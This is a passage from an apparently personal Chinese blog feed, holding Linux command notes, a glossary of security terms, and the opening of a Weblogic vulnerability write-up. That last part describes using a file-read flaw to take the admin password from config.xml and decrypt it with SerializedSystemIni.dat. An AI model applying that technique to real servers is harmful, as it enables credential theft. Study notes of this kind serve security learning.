href="https://cloud.tencent.com/developer/article/1404921">https://cloud.tencent.com/developer/article/1404921</a></p><p>赋予文件权限</p><p><code>chmod +rw filename</code></p><ul><li><p>tar</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">解包：tar xvf FileName.tar</span><br><span class="line">打包：tar cvf FileName.tar DirName</span><br><span class="line">（注：tar是打包，不是压缩！）</span><br></pre></td></tr></table></figure></li></ul><h3 id="文件权限"><a href="#文件权限" class="headerlink" title="文件权限"></a>文件权限</h3><p>理解权限</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# ls -l</span><br><span class="line">total 16</span><br><span class="line">-rwxrwxr-x 1 rich rich 4882 2010-09-18 13:58 myprog</span><br><span class="line">....</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>![image-20230225224057939](..&#x2F;..&#x2F;..&#x2F;..&#x2F;typora img&#x2F;image-20230225224057939.png)</p><p>-rwxrwxr-x解读为-，rwx，rwx，r-x</p><ul><li><p>第一个字符</p><table><thead><tr><th align="center">字符</th><th align="center">含义</th></tr></thead><tbody><tr><td align="center">-</td><td align="center">代表文件</td></tr><tr><td align="center">d</td><td align="center">代表目录</td></tr><tr><td align="center">l</td><td align="center">代表链接</td></tr><tr><td align="center">c</td><td align="center">代表字符型设备</td></tr><tr><td align="center">b</td><td align="center">代表块设备</td></tr><tr><td align="center">n</td><td align="center">n代表网络设备</td></tr></tbody></table></li><li><p>后面9个字符，每三个为一组              </p><table><thead><tr><th align="center">字符</th><th align="center">含义</th><th align="center">每一组对应的安全级别</th></tr></thead><tbody><tr><td align="center">r</td><td align="center">代表对象是可读的</td><td align="center">文件属主的权限</td></tr><tr><td align="center">w</td><td align="center">代表对象是可写的</td><td align="center">属主成员的权限</td></tr><tr><td align="center">x</td><td align="center">代表对象是可执行的</td><td align="center">其他用户的权限</td></tr></tbody></table><blockquote><p>若没有某种权限，在该权限位会出现单破折线。</p><p>属主成员指的是与文件属主在同一个用户组的成员</p><p>其他用户指的是与文件属主不在同一个用户组的成员</p></blockquote></li></ul><img src="E:\typora img\image-20220927165623523.png" alt="image-20220927165623523" style="zoom:67%;" /><h4 id="改变权限"><a href="#改变权限" class="headerlink" title="改变权限"></a>改变权限</h4><p>chmod</p><img src="E:\typora img\image-20221030190551191.png" alt="image-20221030190551191" style="zoom: 67%;" /><p>八进制法</p><p><code>sudo  chmod 777  filename</code></p><blockquote><p>777由上图可知是赋予全部权限</p></blockquote><h4 id="设置默认权限"><a href="#设置默认权限" class="headerlink" title="设置默认权限"></a>设置默认权限</h4><p>umask</p><p>![image-20230318143219603](..&#x2F;..&#x2F;..&#x2F;..&#x2F;typora img&#x2F;image-20230318143219603.png)</p><p>![image-20230318143232817](..&#x2F;..&#x2F;..&#x2F;..&#x2F;typora img&#x2F;image-20230318143232817.png)</p><p>文件权限&#x3D;777-umask&#x3D;755</p><h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><h3 id="查看目录下的文件"><a href="#查看目录下的文件" class="headerlink" title="查看目录下的文件"></a>查看目录下的文件</h3><ul><li><code>ls</code></li></ul><table><thead><tr><th align="center">可选参数</th><th align="center">功能</th></tr></thead><tbody><tr><td align="center">-l</td><td align="center">查看详细信息</td></tr><tr><td align="center">-a</td><td align="center">显示所有文件（包括隐藏文件）</td></tr><tr><td align="center">-R</td><td align="center">展示当前目录下的所有子目录和文件</td></tr><tr><td align="center">-i</td><td align="center">展示文件的索引节点</td></tr><tr><td align="center">-F</td><td align="center">展示文件类型</td></tr></tbody></table><blockquote><p>-F</p><p>目录后加上<code>/</code></p><p>可执行文件后加上<code>*</code></p></blockquote><p>![image-20220819201845329](E:\typora img\image-20220819201845329.png)</p><ul><li><code>dir</code></li><li><code>vdir</code> 等价于 <code>ls -l</code></li></ul><h3 id="查看目录结构"><a href="#查看目录结构" class="headerlink" title="查看目录结构"></a>查看目录结构</h3><p><code>tree dir</code></p><p>![image-20220818190348296](E:\typora img\image-20220818190348296.png)</p><h3 id="创建目录"><a href="#创建目录" class="headerlink" title="创建目录"></a>创建目录</h3><ul><li><p><code>mkdir dir_name</code>：创建单个目录</p></li><li><p><code>mkdir dir1/dir2/dir3</code>：创建多个目录</p><p>![image-20220920223042434](E:\typora img\image-20220920223042434.png)</p></li></ul><h3 id="删除目录"><a href="#删除目录" class="headerlink" title="删除目录"></a>删除目录</h3><ul><li><p><code>rmdir dir_name</code>：删除空目录</p></li><li><p><code>rm  -rf  dir_name</code>：删除非空目录</p><blockquote><p>不使用-f参数的话，需要一一确定是否删除子目录和文件</p><p>更安全，但是更麻烦</p></blockquote></li></ul><h3 id="切换到某个目录"><a href="#切换到某个目录" class="headerlink" title="切换到某个目录"></a>切换到某个目录</h3><p><code>cd dir_path</code></p><h3 id="显示当前所在目录"><a href="#显示当前所在目录" class="headerlink" title="显示当前所在目录"></a>显示当前所在目录</h3><p><code>pwd</code></p><h2 id="进程–process"><a href="#进程–process" class="headerlink" title="进程–process"></a>进程–process</h2><h3 id="查看进程"><a href="#查看进程" class="headerlink" title="查看进程"></a>查看进程</h3><ul><li>ps</li></ul><p>![image-20220819201116476](E:\typora img\image-20220819201116476.png)</p><p>显示了程序的进程ID（Process ID，PID），它们运行在哪个终端（TTY），以及进程已用的CPU时间。</p><p>参数风格</p><p> Unix风格的参数，前面加单破折线；</p><p> BSD风格的参数，前面不加破折线；</p><p> GNU风格的长参数，前面加双破折线。</p><blockquote><p>我喜欢用Unix的</p></blockquote><p>常用参数</p><p>通常使用<code>ps -ef</code></p><table><thead><tr><th align="center">参数</th><th align="center">功能</th></tr></thead><tbody><tr><td align="center">-e</td><td align="center">显示所有运行在系统上的进程</td></tr><tr><td align="center">-f</td><td align="center">显示进程的更多信息</td></tr><tr><td align="center">-l</td><td align="center">进一步显示进程的更多信息</td></tr><tr><td align="center">–forest</td><td align="center">显示进程间的父子关系</td></tr></tbody></table><ul><li>top</li></ul><img src="E:\typora img\image-20220922144049498.png" alt="image-20220922144049498" style="zoom: 67%;" /><blockquote><p>与ps不同的点在于，ps只能显示一个时间点的进程信息，而top是实时更新，就像windows的任务管理器。</p></blockquote><p>交互命令：输入q退出top命令。</p><ul><li><p>lsof</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">lsof -p pid   //查看进程打开了哪些文件</span><br></pre></td></tr></table></figure></li></ul><h3 id="结束进程"><a href="#结束进程" class="headerlink" title="结束进程"></a>结束进程</h3><blockquote><p>在Linux中，进程之间通过信号来通信。</p></blockquote><img src="E:\typora img\image-20220922144615297.png" alt="image-20220922144615297" style="zoom: 67%;" /><ul><li><p><code>kill pid</code>：通过进程的pid来结束进程</p></li><li><p><code>kill -9 pid</code>：强制结束</p></li><li><p><code>killall  process_name</code>：通过进程名结束进程（支持通配符）</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">killall http*</span><br><span class="line">上面的命令结束了所有以http开头的进程</span><br></pre></td></tr></table></figure></li></ul><h2 id="用户"><a href="#用户" class="headerlink" title="用户"></a>用户</h2><h3 id="切换用户"><a href="#切换用户" class="headerlink" title="切换用户"></a>切换用户</h3><p>su  -  用户名</p><p>高权限切换低权限无需密码，反之需要。</p><h3 id="查看第一次登录到系统的用户"><a href="#查看第一次登录到系统的用户" class="headerlink" title="查看第一次登录到系统的用户"></a>查看第一次登录到系统的用户</h3><p>who am i</p><h2 id="特殊符号"><a href="#特殊符号" class="headerlink" title="特殊符号"></a>特殊符号</h2><table><thead><tr><th align="center"></th><th align="center">功能</th></tr></thead><tbody><tr><td align="center">#</td><td align="center">注释后面的命令</td></tr><tr><td align="center">；</td><td align="center">依次执行命令</td></tr><tr><td align="center">|</td><td align="center">管道，前一个命令的输出作为后一个命令的输入</td></tr><tr><td align="center">||</td><td align="center">如果前一条命令执行不成功则执行下一条命令</td></tr><tr><td align="center">&amp;</td><td align="center">后台执行命令</td></tr><tr><td align="center">&amp;&amp;</td><td align="center">如果前一条命令执行成功则执行下一条命令</td></tr><tr><td align="center">$?</td><td align="center">存储上一条命令的执行结果</td></tr></tbody></table><h2 id="网络"><a href="#网络" class="headerlink" title="网络"></a>网络</h2><h3 id="查看ip"><a href="#查看ip" class="headerlink" title="查看ip"></a>查看ip</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ip address show</span><br><span class="line"></span><br><span class="line">ifconfig</span><br></pre></td></tr></table></figure><h3 id="抓取服务流量"><a href="#抓取服务流量" class="headerlink" title="抓取服务流量"></a>抓取服务流量</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo tcpdump -i lo port 6379 -w redis.pcapng</span><br></pre></td></tr></table></figure><h2 id="查找命令"><a href="#查找命令" class="headerlink" title="查找命令"></a>查找命令</h2><p>![image-20221007162424354](E:\typora img\image-20221007162424354.png)</p><ul><li><p><code>find</code></p><p>![image-20230221171347974](..&#x2F;..&#x2F;..&#x2F;..&#x2F;typora img&#x2F;image-20230221171347974.png)</p><p>![image-20230324204821642](..&#x2F;..&#x2F;..&#x2F;..&#x2F;typora img&#x2F;image-20230324204821642.png)</p></li><li><p><code>locate</code></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">更新索引数据库</span></span><br><span class="line">sudo updatedb</span><br></pre></td></tr></table></figure></li></ul><h2 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h2><blockquote><p>端口是通过端口号来标记的，端口号只有整数，范围是从0~65535 </p></blockquote><p><a href="https://www.runoob.com/w3cnote/linux-check-port-usage.html">https://www.runoob.com/w3cnote/linux-check-port-usage.html</a></p><ul><li><p>lsof</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">lsof -i:8000  //查看8000端口占用情况</span><br></pre></td></tr></table></figure></li><li><p><code>netstat</code> </p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">netstat -ntlp   //查看当前所有tcp端口</span><br><span class="line">netstat -ntulp | grep 80   //查看所有80端口使用情况</span><br><span class="line">netstat -ntulp | grep 3306   //查看所有3306端口使用情况</span><br></pre></td></tr></table></figure><p>![image-20220804194025228](E:\typora img\image-20220804194025228.png)</p></li></ul><h2 id="服务"><a href="#服务" class="headerlink" title="服务"></a>服务</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">systemctl  command  服务</span><br></pre></td></tr></table></figure><table><thead><tr><th align="center">command</th><th align="center">mean</th></tr></thead><tbody><tr><td align="center">status</td><td align="center">查看服务状态</td></tr><tr><td align="center">start</td><td align="center">启动服务</td></tr><tr><td align="center">restart</td><td align="center">重启服务</td></tr><tr><td align="center">stop</td><td align="center">停止服务</td></tr><tr><td align="center">enable</td><td align="center">开机自启服务</td></tr><tr><td align="center">disable</td><td align="center">取消开机自启服务</td></tr></tbody></table><p>reload:不关闭unit的情况下,重新载入配置文件,让设置生效。<br>is- active:目前有没有正在运行中。<br>is- enabled:开机时有没有默认要启用这个unit。<br>kill:不要被kill这个名字吓着了,它其实是向运行unit的进程发送信号<br>show:列出unit的配置。<br>mask:禁用服务<br>unmask:取消对服务的禁用</p><p>list-unit-files|grep enable:列出所有自启动服务</p><p>![image-20221024194730467](E:\typora img\image-20221024194730467.png)</p><p>loaded：开机是否自启动，enabled说明是自启动的</p><p>active：现在是否启动，active（running)说明正在</p><h2 id="使用技巧"><a href="#使用技巧" class="headerlink" title="使用技巧"></a>使用技巧</h2><p><img src="/../../../../blog/source/images/image-20230221171851141-1693403138821.png" alt="image-20230221171851141"></p><p><img src="/../../../../blog/source/images/image-20230221171905266-1693403138820.png" alt="image-20230221171905266"></p><h3 id="为命令起别名"><a href="#为命令起别名" class="headerlink" title="为命令起别名"></a>为命令起别名</h3><blockquote><p><code>alias</code>命令是另一个shell的内建命令。命令别名允许你为常用的命令（及其参数）创建另一</p><p>个名称，从而将输入量减少到最低。</p></blockquote><p><code>alias 别名=&#39;原命令&#39;</code></p><p>下面为展示隐藏文件的ls命令起别名<code>la</code></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# alias la=&#x27;ls -a&#x27;</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# la</span><br><span class="line">.  ..  .bash_history  .bash_logout  .bash_profile  .bashrc  .cache  .cshrc  H1ve  .pip  .pki  .pydistutils.cfg  .ssh  .tcshrc  .viminfo  web</span><br></pre></td></tr></table></figure><blockquote><p>注意命令别名属于内部命令，一个别名仅在它所被定义的shell进程中才有效。</p><p>可以通过在~&#x2F;.bashrc文件内编写，已达到永久生效的效果</p></blockquote><h3 id="执行历史命令"><a href="#执行历史命令" class="headerlink" title="执行历史命令"></a>执行历史命令</h3><p>先用<code>history</code>命令查看历史命令记录，再用<code>！+ 命令编号</code>执行历史命令。</p><p><img src="/../../../../blog/source/images/image-20220923183323571-1693403159124.png" alt="image-20220923183323571"></p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>计算机名词解释</title>
      <link href="/2023/05/30/%E6%A6%82%E5%BF%B5/"/>
      <url>/2023/05/30/%E6%A6%82%E5%BF%B5/</url>
      
        <content type="html"><![CDATA[<h1 id="常见名词解释"><a href="#常见名词解释" class="headerlink" title="常见名词解释"></a>常见名词解释</h1><table><thead><tr><th align="center">名词</th><th align="center">解释</th></tr></thead><tbody><tr><td align="center">0day(Zero-day)</td><td align="center">没有补丁的安全漏洞</td></tr><tr><td align="center">Nday</td><td align="center">官方发布了补丁，但该漏洞仍然大量未修复，存在一定可利用性</td></tr><tr><td align="center">POC</td><td align="center">一段无害的用来证明漏洞存在的代码</td></tr><tr><td align="center">EXP（exploit）</td><td align="center">一段对漏洞如何利用的详细说明或者一个演示的漏洞攻击代码</td></tr><tr><td align="center">payload（有效载荷）</td><td align="center">指成功 exploit 之后，真正在目标系统执行的代码或指令</td></tr><tr><td align="center">CVE</td><td align="center">Common Vulnerabilities &amp; Exposures 公共漏洞和暴露      CVE编号–漏洞标签</td></tr><tr><td align="center">ShellCode</td><td align="center">一段16进制机器码，可在暂存器eip溢出后，塞入一段可让CPU执行的shellcode机器码，从而执行任意指令，EIP<code>寄存器，它里面存放的值是</code>CPU<code>下次要执行的指令地址，因此可以通过修改</code>EIP<code>寄存器的值来执行</code>shellcode</td></tr><tr><td align="center">FUZZ</td><td align="center">模糊测试：随机输入，观察输</td></tr><tr><td align="center">CMS</td><td align="center">内容管理系统：指的是一种内容编辑程序。就像在博客写文章一样，不需要懂得编程的人，也可以通过CMS发布，更改，管理内容。</td></tr><tr><td align="center">CNVD</td><td align="center">China National Vulnerability Database                                   国家信息安全漏洞共享平台</td></tr><tr><td align="center">Rootkit</td><td align="center">载入到操作系统内核中的恶意软件，具有root权限</td></tr><tr><td align="center">WAF</td><td align="center">Web应用防火墙，具有针对 HTTP&#x2F;HTTPS 的安全策略</td></tr><tr><td align="center">堡垒机</td><td align="center">监控和记录运维人员对网络内的服务器、网络设备、安全设备、数据库等设备的操作行为，以便集中报警、及时处理及审计定责。</td></tr><tr><td align="center">彩虹表</td><td align="center">空间换时间，通过哈希碰撞破解哈希值</td></tr><tr><td align="center">供应链攻击</td><td align="center">攻击软件供应商，如向更新程序中注入木马</td></tr><tr><td align="center">沙箱</td><td align="center">虚拟系统程序：     在隔离环境中，用以测试不受信任的文件或应用程序等行为的工具</td></tr><tr><td align="center">域名泛解析</td><td align="center"><code>*.a.com</code>指向同一IP</td></tr><tr><td align="center">OSINT</td><td align="center"><strong>公开来源情报</strong>（OSINT, Open Source INTelligence）是从公开来源收集到的情报</td></tr><tr><td align="center"></td><td align="center"></td></tr><tr><td align="center"></td><td align="center"></td></tr><tr><td align="center"></td><td align="center"></td></tr><tr><td align="center"></td><td align="center"></td></tr><tr><td align="center"></td><td align="center"></td></tr><tr><td align="center"></td><td align="center"></td></tr><tr><td align="center"></td><td align="center"></td></tr><tr><td align="center"></td><td align="center"></td></tr><tr><td align="center"></td><td align="center"></td></tr><tr><td align="center"></td><td align="center"></td></tr><tr><td align="center"></td><td align="center"></td></tr></tbody></table><h1 id="蠕虫、病毒之间的区别"><a href="#蠕虫、病毒之间的区别" class="headerlink" title="蠕虫、病毒之间的区别"></a>蠕虫、病毒之间的区别</h1><p><img src="/../images/image-20230518203842099.png" alt="image-20230518203842099"></p><h1 id="token-x2F-cookie-x2F-session"><a href="#token-x2F-cookie-x2F-session" class="headerlink" title="token&#x2F;cookie&#x2F;session"></a>token&#x2F;cookie&#x2F;session</h1><p><a href="https://www.bilibili.com/video/BV1ob4y1Y7Ep">https://www.bilibili.com/video/BV1ob4y1Y7Ep</a></p><ol><li><p>cookie</p><ul><li><p>产生的原因</p><p>因为http是无状态协议，假设我以khaz的身份去访问服务器，等到下一次我再次访问服务器时，服务器还是不知道我是谁，我仍需要向服务器提交数据说明我是khaz。这样就导致了在同一个网站下我每次访问一个服务都需要提交一次数据，很麻烦。</p></li><li><p>本质</p><p>浏览器存储技术，实现每次HTTP请求都自动提交数据给服务器的技术。</p></li><li><p>机制</p><p>当用户第一次登录后，服务器返回的response中会有一个set-cookie字段，当我们的浏览器接收到response后，就会将set-cookie中的值保存到cookie中，然后每次我们登陆时浏览器就会自动在请求中为我们带上cookie，服务端接收后去数据库中核实cookie信息。</p></li><li><p>实例</p><p>通常，我们可以从很多网站的登录界面中看到“请记住我”这样的选项，如果你勾选了它之后再登录，那么在下一次访问该网站的时候就不需要进行重复而繁琐的登录动作了，而这个功能就是通过Cookie实现的。</p></li></ul></li><li><p>session</p><ul><li><p>产生的原因</p><p>因为cookie是保存在浏览器中的，用户可以随意查看和修改很不安全。</p></li><li><p>本质</p><p>一种概念。让HTTP从无状态连接变为有状态连接（会话状态）。</p></li><li><p>机制</p><p>当用户第一次登录后，服务端会在内存中生成session对象用于保存用户信息，同时通过set-cookie字段将session-id保存到浏览器中。在会话的有效期内，客户端每次请求都会带上session-id，服务端根据session-id找到对应的session，核实用户的身份。</p><blockquote><p>注：会话的有效期是通过设置cookie的有效期实现的。</p></blockquote></li></ul></li><li><p>token</p><ul><li><p>产生的原因</p><p>因为session的机制，服务端需要在内存中保存session，就会出现一些问题。例如：</p><ul><li>大量session对象的存储带来的内存消耗</li><li>各服务器之间session的复制</li><li>专门用于存储session的服务器宕机</li></ul></li><li><p>本质</p><p>身份令牌</p></li><li><p>机制</p><p>当用户第一次登陆后，服务端会生成一个token令牌。通过 set-cookie字段保存到浏览器中。</p><p>在令牌的有效期内，客户端每次请求都会带上token令牌，服务端通过保存的密钥验证签名来核对用户身份。</p></li><li><p>实例</p><p> json web token，JWT</p><p>总结</p><blockquote><p>cookie：</p><p>客户端保存，服务端不保存。</p><p>session：</p><p>客户端只保存session-id，服务端保存session对象。</p><p>token：</p><p>客户端保存token，服务端只保存token签名的密钥。</p></blockquote></li></ul></li></ol><h1 id="正向-x2F-反向代理"><a href="#正向-x2F-反向代理" class="headerlink" title="正向&#x2F;反向代理"></a>正向&#x2F;反向代理</h1><p><a href="https://www.cloudflare.com/zh-cn/learning/cdn/glossary/reverse-proxy/">https://www.cloudflare.com/zh-cn/learning/cdn/glossary/reverse-proxy/</a></p><ul><li><p>正向代理</p><blockquote><p>转发代理，通常称为代理、代理服务器或 Web 代理，是位于一组客户端计算机之前的服务器,确保没有源站直接与该特定客户端通信</p></blockquote><p><img src="/../images/forward-proxy-flow.svg" alt="正向代理流"></p></li></ul><p>​        在标准的互联网通信中，计算机 A 将直接与计算机 C 保持联系，客户端将请求发送到<a href="https://www.cloudflare.com/learning/cdn/glossary/origin-server/">源服务器</a>，并且源服务器将响应客户端。当存在正向&#x2F;转发代理时，A 将请求发送到 B，B 随后将请求转发给 C。C 将向 B 发送响应，而 B 则将响应转发给 A。</p><ul><li><p>反向代理</p><blockquote><p>反向代理是位于一个或多个 Web 服务器前面的服务器，拦截来自客户端的请求，确保没有客户端直接与该源站通信。</p></blockquote><p><img src="/../images/reverse-proxy-flow.svg" alt="反向代理流"></p></li></ul><p>​       通常，来自 D 的所有请求都将直接发送到 F，而 F 会直接将响应发送到 D。使用反向代理，来自 D 的所有请求都将直接发送给 E，而 E 会将其请求发送到 F 并从 F 接收响应，然后将适当响应传递给 D。</p><table><thead><tr><th align="left"></th><th>对象</th><th>优点</th></tr></thead><tbody><tr><td align="left">正向&#x2F;转发代理</td><td>客户端</td><td>匿名，绕过访问限制</td></tr><tr><td align="left">反向代理</td><td>服务端</td><td>更加安全，提高服务器性能</td></tr></tbody></table><h1 id="静态web和动态web"><a href="#静态web和动态web" class="headerlink" title="静态web和动态web"></a>静态web和动态web</h1><p><a href="https://help.dedecms.com/shiyongshouce/moshi/mingci.html">https://help.dedecms.com/shiyongshouce/moshi/mingci.html</a></p><p>伪静态即是网站本身是动态网页如.php、.asp、.aspx等格式动态网页有时这类动态网页还跟”?”加参数来读取数据库内不同资料，伪静态就是做url重写操作(即rewrite)。</p><p>demo</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">跳转需求：</span><br><span class="line">访问http:<span class="comment">//www.kevin.com/p/123456.html  跳转成  http://a.aa.com/p/123456</span></span><br><span class="line"></span><br><span class="line">配置如下:</span><br><span class="line">rewrite ^/p/(\d+).html    http:<span class="comment">//www.kevin.com/p/$1 last;</span></span><br><span class="line"></span><br><span class="line">解释说明：</span><br><span class="line">\d是数字的意思 +是最少一个&#123;<span class="number">1</span>,&#125; <span class="number">1</span>到无穷大&#123;<span class="number">1</span>,<span class="number">3</span>&#125; 这样是<span class="number">1</span>-<span class="number">3</span>位数。</span><br></pre></td></tr></table></figure><h1 id="DDOS攻击和CC攻击"><a href="#DDOS攻击和CC攻击" class="headerlink" title="DDOS攻击和CC攻击"></a>DDOS攻击和CC攻击</h1><p>DDoS攻击打的是网站的服务器，而CC攻击是针对网站的页面攻击的。</p><p>用术语来说就是，一个是WEB网络层拒绝服务攻击（DDoS），一个是WEB应用层拒绝服务攻击（CC）。</p><p>网络层就是利用肉鸡的流量去攻击目标网站的服务器，针对比较本源的东西去攻击（通信信道），服务器瘫痪了，那么运行在服务器上的网站肯定也不能正常访问了。</p><p>而应用层就是我们用户看得到的东西，就比如说网页，CC攻击就是针对网页来攻击的，CC攻击本身是正常请求，网站动态页面的正常请求也会和数据库进行交互的，当这种”正常请求”达到一种程度的时候，服务器就会响应不过来，从而崩溃。</p><h1 id="彩虹表"><a href="#彩虹表" class="headerlink" title="彩虹表"></a>彩虹表</h1><p><a href="https://zhuanlan.zhihu.com/p/105578739">https://zhuanlan.zhihu.com/p/105578739</a></p><p><strong>彩虹表</strong>(<code>rainbow table</code>)是一个用于<a href="https://link.zhihu.com/?target=https://zh.wikipedia.org/wiki/%E5%8A%A0%E5%AF%86%E6%95%A3%E5%88%97%E5%87%BD%E6%95%B0">加密散列函数</a>逆运算的预先计算好的<a href="https://link.zhihu.com/?target=https://zh.wikipedia.org/wiki/%E6%9F%A5%E6%89%BE%E8%A1%A8">表</a>，常用于破解加密过的密码散列。如MD5，SHA1.</p><p> 查找表常常用于包含有限字符固定长度<a href="https://link.zhihu.com/?target=https://zh.wikipedia.org/wiki/%E7%BA%AF%E6%96%87%E6%9C%AC">纯文本</a><a href="https://link.zhihu.com/?target=https://zh.wikipedia.org/wiki/%E5%AF%86%E7%A0%81">密码</a>的加密。</p><p>事先准备大量哈希链表：</p><p>X：随机生成的明文</p><p>H：哈希函数</p><p>R：自定义函数</p><p><img src="/../images/image-20220622152607746-1686284457479.png" alt="image-20220622152607746"></p><p>只保存开头和末尾位置即X和Rn。</p><p>对于经过H得到的密文C进行破解：首先使用R得到Y&#x3D;R（C），再将Y与Rn进行比较。</p><p>①如果相等，则说明密文C对应的明文P在哈希链表中的Rn-1处。原理见下图。</p><p><img src="/../images/image-20220622153058176-1686284457479.png" alt="image-20220622153058176"></p><p>②如果不相等，则说明密文C对应的明文P不在哈希链表中的Rn-1处。所以需要向前查找是否在Rn-2~R1处。</p><p>具体流程：对Y再用H和R函数，得到Y‘，与Rn比较，如果相等，则说明明文为Rn-2，如果不是，就重复步骤，直到所有哈希链表都查找过，说明破解失败。</p><p>防御手段：加密时使用盐值</p><h1 id="堆和栈"><a href="#堆和栈" class="headerlink" title="堆和栈"></a>堆和栈</h1><p><a href="https://cloud.tencent.com/developer/article/1688327">堆和栈的区别</a></p><blockquote><p>栈区保存声明的变量例如<code>int a=1</code>,由系统自动分配</p><p>堆区保存用户申请的变量例如<code>malloc</code>，<code>b=&amp;a</code></p><p>程序在编译变量和对函数分配内存都在栈上进行，且函数调用时参数的传递也是在栈上进行。</p></blockquote><h1 id="按值传递，按引用传递和按指针传递"><a href="#按值传递，按引用传递和按指针传递" class="headerlink" title="按值传递，按引用传递和按指针传递"></a>按值传递，按引用传递和按指针传递</h1><p><a href="https://www.junmajinlong.com/coding/pass_by_value_or_ref/">https://www.junmajinlong.com/coding/pass_by_value_or_ref/</a></p><ul><li><p>按值传递</p><blockquote><p>开辟新空间，将数据对象拷贝一份副本到新空间中</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">int</span> a=<span class="number">10</span>;</span><br><span class="line"><span class="built_in">int</span> b=a;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221027160246647-1686284933113.png" alt="image-20221027160246647"></p><blockquote><p>这时候修改a或b的值，都不会影响另一个变量的值</p></blockquote></li><li><p>按引用传递</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> a=<span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> &amp;b=a;</span><br></pre></td></tr></table></figure><blockquote><p>不开辟新空间，只是给数据对象所在空间名起了一个别名</p></blockquote><p><img src="/../images/image-20221027160357481-1686284933114.png" alt="image-20221027160357481"></p><blockquote><p>这时候修改a或b的值，应该会影响另一个变量的值，因为二者的地址是一样的。</p></blockquote></li><li><p>按指针传递</p><p>在c或c++可以操作指针的语言中</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> a=<span class="number">10</span>;</span><br><span class="line"><span class="type">int</span>* b=&amp;a;</span><br></pre></td></tr></table></figure><blockquote><p>在堆内存中开辟空间用来保存指针b，b指向a所在的地址（保存a的地址）。</p></blockquote><p><img src="/../images/image-20221027160713576-1686284933115.png" alt="image-20221027160713576"></p></li></ul><h1 id="阻塞和非阻塞，同步和异步"><a href="#阻塞和非阻塞，同步和异步" class="headerlink" title="阻塞和非阻塞，同步和异步"></a>阻塞和非阻塞，同步和异步</h1><p>是node.js里经常遇到的词汇，我举个简单的例子来说明：</p><p>我要看足球比赛，但是妈妈叫我烧水，电视机在客厅，烧水要在厨房。家里有2个水壶，一个是普通的水壶，另一个是水开了会叫的那种水壶。我可以：</p><ol><li>用普通的水壶烧，人在边上看着，水开了再去看球。<strong>（同步，阻塞）</strong>这个是常规做法，但是我看球不爽了。</li><li>用普通水壶烧，人去看球，隔几分钟去厨房看看。<strong>（同步，非阻塞）</strong>这个又大问题，万一在我离开的几分钟水开了，我就麻烦了。</li><li>用会叫的水壶，人在边上看着。<strong>（异步，阻塞）</strong>这个没有问题，但是我太傻了。</li><li>用会叫的水壶，人去看球，听见水壶叫了再去看。<strong>（异步，非阻塞）</strong>这个应该是最好的。</li></ol><p>等着看球的我：阻塞</p><p>看着电视的我：非阻塞</p><p>普通水壶：同步</p><p>会叫的水壶：异步</p><p>所以，异步往往配合非阻塞，才能发挥出威力。</p><h1 id="MVC架构"><a href="#MVC架构" class="headerlink" title="MVC架构"></a>MVC架构</h1><p><img src="/../images/MVC-1669639280429-1686284933115.png" alt="MVC"></p><h1 id="小端序和大端序"><a href="#小端序和大端序" class="headerlink" title="小端序和大端序"></a>小端序和大端序</h1><p><img src="/../images/image-20221209213725351.png" alt="image-20221209213725351"></p><h1 id="CGI与fastCGI"><a href="#CGI与fastCGI" class="headerlink" title="CGI与fastCGI"></a>CGI与fastCGI</h1><p><a href="https://www.cnblogs.com/tssc/p/10255590.html#_label4_4">关于CGI和FastCGI的理解 - 天生帅才 - 博客园</a></p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Weblogic漏洞</title>
      <link href="/2023/05/01/Weblogic/"/>
      <url>/2023/05/01/Weblogic/</url>
      
        <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/xublog/article/details/45395587">Weblogic控制台中文显示还是英文显示，浏览器语言设置决定的_sxusky的博客-CSDN博客</a></p><h1 id="特征"><a href="#特征" class="headerlink" title="特征"></a>特征</h1><p><img src="/../images/image-20230819124339256.png" alt="image-20230819124339256"></p><p>第一次访问路径</p><p><img src="/../images/image-20230819131045739.png" alt="image-20230819131045739"></p><p>&#x2F;console 管理台页面和版本</p><p><img src="/../images/image-20230819150256846.png" alt="image-20230819150256846"></p><h1 id="版本号判断"><a href="#版本号判断" class="headerlink" title="版本号判断"></a>版本号判断</h1><p><a href="https://mp.weixin.qq.com/s/z6q1sBYcHYgzvak98QQmeA">第21篇：判断Weblogic详细版本号的方法总结 (qq.com)</a></p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><blockquote><p>Weblogic洞实在太多了。。</p></blockquote><h2 id="配合文件读取来读取管理员账密"><a href="#配合文件读取来读取管理员账密" class="headerlink" title="配合文件读取来读取管理员账密"></a>配合文件读取来读取管理员账密</h2><p>config.xml：搜索<code>&lt;node-manager-password-encrypted&gt;</code></p><p><img src="/../images/image-20230819133229460.png" alt="image-20230819133229460"></p><p>密码解密</p><ul><li>密钥：SerializedSystemIni.dat（二进制文件，使用burp保存）</li><li>解密</li></ul><h2 id="文件包含–CVE-2022-21371"><a 